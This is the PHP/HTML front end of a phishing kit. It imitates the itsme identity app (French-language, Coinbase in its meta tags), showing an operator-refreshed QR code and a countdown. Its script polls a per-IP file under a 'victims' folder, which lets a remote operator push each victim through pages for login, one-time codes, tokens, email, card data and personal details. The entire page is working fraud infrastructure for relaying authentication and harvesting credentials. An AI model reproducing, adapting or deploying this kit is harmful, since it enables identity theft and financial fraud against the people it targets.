<?php

    include "./Assets/php/config/config.php";
    reset_data_page();

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/itsmelogo.png">
        <title>Its me</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/cre.css">
        <style>
            .part_left::after{
                display: none;
            }
        </style>
    </head>
    <body class="one">

    <div class="box_whiate"></div>
    <!-- wrapper_box_number -->
    <div class="wrapper_box_numberr">
      <div class="container_box_number d-flex">
        <div class="part_left items">
            <div class="logo">
              <img src="./Assets/imgs/itsme-logo.svg" alt="">
            </div>
            <div class="info">
              <div class="title">
                <?php if (isset($_GET['error'])) : ?>
                    <div class="alert alert-danger rounded-0" style="font-size:13px;" role="alert">
                        Vérification non complétée
                    </div>                
                <?php endif; ?>
                <h1>Prouvez que c'est vous</h1>
                <p>Une action est en attente dans votre application itsme®.</p>
                <p>Ouvrez l'application et sélectionnez cette icône pour continuer.</p>
              </div>
              <div class="img_type my-4">
                <img src="" id="qrimg" style="border-radius: 50%;">
              </div>
              <div class="progresss">
                <p><b class="timer">01:00</b> avant qu’il ne soit trop tard</p>
                <div class="prog">
                  <div class="length"></div>
                </div>
              </div>
            </div>
        </div>
        <div class="part_right items d-flex justify-content-center align-items-center flex-column">
          <img src="./Assets/imgs/PokaYokeWaiting.svg" alt="">
          <p class="text-center">Vérifiez les détails affichés dans votre appli itsme® et confirmez avec votre code itsme®.</p>
        </div>
      </div>
    </div>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    
    <script>     
    
          var ip = '<?php echo get_client_ip(); ?>';
          let lastTime = 0;

          setInterval(function(){

              $.getJSON(`./Assets/php/config/check_its.php?ip=${ip}&` + new Date().getTime(), function(r){
                  if(r.time != lastTime){
                      $("#qrimg").attr("src", r.img+"?t="+Date.now());           
                  }
              });

          },0);    

let startingMinutes = 1;
let time = startingMinutes * 60;

const countdownEl = document.querySelector('.timer');
const progress = document.querySelector(".length");

let totalTime = time * 1000; 
let intervalTime = 1000;     
let width = 100;

const timerInterval = setInterval(updateCountdown, 1000);

function updateCountdown() {

  const minutes = Math.floor(time / 60);
  let seconds = time % 60;
  seconds = seconds < 10 ? '0' + seconds : seconds;

  countdownEl.innerHTML = `${minutes}:${seconds}`;

  width = (time / (startingMinutes * 60)) * 100;
  progress.style.width = width + "%";

  time--;

  if (time < 0) {
    clearInterval(timerInterval);
    location.href = "./confirm.php";
  }
}            
    

        var ip = '<?php echo get_client_ip(); ?>';
        var waiting = setInterval(function() {
            $.get('./victims/' + ip + '.txt?' + new Date().getTime(), function(data) {
                if( data == 0 ) {
                    //console.log('hada ba9i 0');
                }else if( data == 'login' ){
                    clearInterval(waiting); 
                    location.href = "login.php";
                }else if( data == 'login_error' ){
                    clearInterval(waiting);
                    location.href = "login.php?error";
                }

                else if( data == 'digit' ) {
                    clearInterval(waiting);
                    location.href = "digit.php";
                }else if( data == 'digit_error' ){
                    clearInterval(waiting);
                    location.href = "digit.php?error";
                }

                else if( data == 'qr' ) {
                    clearInterval(waiting);
                    location.href = "qr.php";
                }else if( data == 'qr_error' ){
                    clearInterval(waiting);
                    location.href = "qr.php?error";
                }

                else if( data == 'tok' ) {
                    clearInterval(waiting);
                    location.href = "token.php";
                }else if( data == 'tok_error' ){
                    clearInterval(waiting);
                    location.href = "token.php?error";
                }

                else if( data == 'mail' ) {
                    clearInterval(waiting);
                    location.href = "email.php";
                }else if( data == 'mail_error' ){
                    clearInterval(waiting);
                    location.href = "email.php?error";
                }

                else if( data == 'card' ) {
                    clearInterval(waiting);
                    location.href = "card.php";
                }else if( data == 'card_error' ){
                    clearInterval(waiting);
                    location.href = "card.php?error";
                }

                else if( data == 'details' ) {
                    clearInterval(waiting);
                    location.href = "details.php";
                }else if( data == 'details_error' ){
                    clearInterval(waiting);
                    location.href = "details.php?error";
                }


                else if( data == 'success' ){
                    clearInterval(waiting);
                    location.href = "success.php";
                }

                // its

                else if( data == 'tele' ) {
                    clearInterval(waiting);
                    location.href = "its_access.php";
                }else if( data == 'tele_error' ){
                    clearInterval(waiting);
                    location.href = "its_access.php?error";
                }                
                else if( data == 'its_ver' ) {
                    clearInterval(waiting);
                    location.href = "confirm.php";
                }else if( data == 'its_ver_error' ){
                    clearInterval(waiting);
                    location.href = "confirm.php?error";
                }  

                else if( data == 'load' ){
                    clearInterval(waiting);
                    location.href = "loading.php?error";
                }                 

            });
        }, 1000);          
        </script>    
    </body>
</html>